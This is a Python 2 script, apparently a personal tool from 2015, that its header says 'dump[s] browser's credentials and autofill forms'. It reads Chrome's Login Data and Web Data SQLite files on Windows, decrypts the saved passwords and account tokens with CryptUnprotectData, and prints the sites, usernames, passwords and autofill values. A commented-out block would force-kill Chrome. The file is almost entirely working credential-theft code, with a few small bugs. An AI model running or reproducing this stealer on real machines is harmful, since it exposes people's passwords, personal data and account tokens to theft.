'''
Created on 17 Feb 2015

@author: Dan (Idan) Taler

This program dump browser's credentials and autofill forms
'''

from os import getenv
import sqlite3
import win32crypt
import sys, os, subprocess, time
import binascii

#class BrowserDataEncrypt(): 

bb = win32crypt.CryptUnprotectData(u"john",u"psw", None, None, 0)
print str(binascii.hexlify(bb)).upper()

Login_Data_File =  getenv("APPDATA") + "\..\Local\Google\Chrome\User Data\Default\Login Data"   # Credentials
Web_Data_File   =  getenv("APPDATA") + "\..\Local\Google\Chrome\User Data\Default\Web Data"     # autoFills
 
 
# Connect to the Database
try:
    con1 = sqlite3.connect(Login_Data_File)
    con2 = sqlite3.connect(Web_Data_File)

#print getenv("APPDATA")

    cursor1 = con1.cursor()
    cursor2 = con2.cursor()

    # ---Chrome Saved Credentials --------
    # SQL COMMAND - Login_Data  - Credentials
    cursor1.execute('SELECT action_url, username_value, password_value FROM logins')
    
    for result in cursor1.fetchall():
      # Decrypt the Password
      
        password = win32crypt.CryptUnprotectData(result[2], None, None, None, 0)[1]
        if password:
            print '------------ Chrome Passwords ------------------'
            print 'Site:         '      + result[0]
            print 'Username:     '      + result[1]
            print 'Password:     '      + password         
        else:
            print "No passwords at this point!"
    print '--------------------------------------------------------\n'        


    #----Chrome Autofill Tables----------
    
    #credit_cards table
    
    
    
    # -----Autofill Data: 
    # ====================================================       
    cursor2.execute("SELECT COUNT(name), COUNT(DISTINCT name) FROM autofill")
    
    aa = cursor2.fetchone()
    print " Found "+str(aa[0])+" entries with "+str(aa[1])+" unique values"
    print " Dumping data ->"
    
    time.sleep(0)
    
    cursor2.execute("SELECT name, value FROM autofill")
    
    counter =0
    for result in cursor2.fetchall():
        if result:       
            #print str(counter) +" name:  " +str(result[0]) + " \t  Value: " + str(result[1])
            print str(counter)+' {0:50} ==> {1:30}'.format(result[0],result[1])
            counter = counter +1
        else:
            print "No autofill entries were found "
            
            
    #------------Account Service Data: 
    # =================================================     

    cursor2.execute("SELECT service,encrypted_token FROM token_service")
    
    aa = cursor2.fetchone()
    
    for result in cursor2.fetchall():
        autoFill_accountService = win32crypt.CryptUnprotectData(result[1], None, None, None, 0)[1]
        if autoFill_accountService:
            print 'Site: ' + autoFill_accountService      
        else:
            print 'No accounts were found!'

            
except sqlite3.Error, e:
    print "Error %s:" % e.args[0]
    print "Chrome may be in used"
    sys.exit(1)
    
finally:
    if con1:
            con1.close()
    if con2:
            con2.close()


"""
if 'chrome.exe' in subprocess.Popen('tasklist', stdout=subprocess.PIPE).communicate()[0]:
    subprocess.Popen('taskkill /F /im chrome.exe /T')
""" 
"""
if __name__ == '__main__':
    unittest.main()
 """      